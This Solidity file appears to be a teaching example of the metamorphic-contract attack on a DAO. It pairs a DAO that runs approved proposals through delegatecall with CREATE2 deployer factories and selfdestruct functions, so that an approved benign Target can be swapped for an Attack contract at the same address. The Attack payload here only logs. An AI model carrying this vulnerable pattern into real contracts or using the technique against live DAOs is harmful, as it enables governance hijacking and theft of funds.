// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol"; // solhint-disable
import "forge-std/console.sol";
import "@openzeppelin/contracts/utils/Strings.sol";

contract DAO {
    struct Proposal {
        address target;
        bool approved;
        bool executed;
    }
    address public owner = msg.sender;
    Proposal[] public proposals;

    function approve(address target) external {
        require(msg.sender == owner, "not authorized");

        proposals.push(
            Proposal({target: target, approved: true, executed: false})
        );
    }

    function execute(uint256 proposalId) external payable {
        Proposal storage proposal = proposals[proposalId];
        require(proposal.approved, "not approved");
        require(!proposal.executed, "executed");

        proposal.executed = true;

        (bool ok, ) = proposal.target.delegatecall(
            abi.encodeWithSignature("executeProposal()")
        );
        require(ok, "delegatecall failed");
    }
}

contract Target {
    function executeProposal() external payable {
        console.log("Executed in Target");
    }

    function destroy() public {
        selfdestruct(payable(msg.sender));
    }
}

contract Attack {
    function executeProposal() external payable {
        console.log("Executed in Attack");
    }

    function destroy() public {
        selfdestruct(payable(msg.sender));
    }
}

contract Deployer {
    function deployTarget() external returns (Target) {
        return new Target();
    }

    function deployAttack() external returns (Attack) {
        return new Attack();
    }

    function destroy() public {
        selfdestruct(payable(msg.sender));
    }
}

contract DeployerFactory {
    function create() public returns (Deployer) {
        bytes32 salt = keccak256(abi.encode(uint(123)));
        return new Deployer{salt: salt}();
    }

    function destroy() public {
        selfdestruct(payable(msg.sender));
    }
}
